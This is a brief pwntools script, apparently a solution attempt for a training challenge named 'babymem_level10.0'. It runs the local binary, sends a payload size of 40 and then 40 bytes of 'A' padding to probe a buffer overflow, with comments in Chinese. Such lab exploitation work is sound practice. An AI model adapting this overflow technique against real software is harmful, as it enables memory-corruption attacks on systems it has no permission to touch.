from pwn import *
import os
os.chdir("./CH3-memory_errors/1.1")

 
context.arch = 'amd64'

p = process('./babymem_level10.0')

# p.recvuntil('Payload size:')

# 准备有效载荷
padding = 40
p.sendline(b'40')

payload = b'A'*padding

 
p.sendline(payload)

# 与进程进行交互，以查看输出或调试
p.interactive()
